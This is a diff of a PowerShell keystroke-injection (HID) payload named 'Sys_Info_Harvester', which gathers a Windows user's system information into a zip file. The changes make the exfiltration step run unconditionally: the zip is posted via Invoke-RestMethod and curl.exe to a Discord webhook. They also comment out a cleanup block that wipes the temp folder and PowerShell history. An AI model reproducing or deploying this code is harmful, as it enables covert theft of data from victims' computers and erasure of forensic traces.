@@ -2,7 +2,7 @@
 #                                             |                                                                   |             .'''''.        ..||..'''''''...      #
 # -Title     :Sys_Info_Harvester              |                                                                   |            / ##### \       : ||            ''.   #
 # -Author    :ItsIsaac                        |                                                                   |           | ## # ## |      :.||...''''''....  '. #
-# -Version   :1.0                             |                                                                   |           | #  #  # |        ||             '''' &
+# -Version   :1.1                             |                                                                   |           | #  #  # |        ||             '''' &
 # -Category  :System/ User Info Grab          |       .___  __           .___                                     |            \ ##### /     /| < _>                 #
 # -Target    :W 10/11                         |       |   |/  |_  ______ |   | ___________  _____    ____         |             \ ### /     / |/ < _>                #
 # -Mode:     :HID                             |       |   \   __\/  ___/ |   |/  ___/\__  \ \__  \ _/ ___\        |           ..''   ''... /  |  < _>                #
@@ -447,7 +447,7 @@ param (
 )
 
 #Webhook created in discord channel
-$hookurl = '$dc'
+$hookurl = "$dc"
 
 
 $Body = @{
@@ -460,10 +460,10 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$env:USERNAME-Harvester.zip"}
+Upload-Discord -file "$env:tmp/$env:USERNAME-Harvester.zip"
 
 ######################################################################################################################################################################
-
+<#
 #Clean UP
 #Clear temp folder
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
@@ -476,3 +476,4 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 #Clear recycle bin (not currently in use)
 #Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+#>
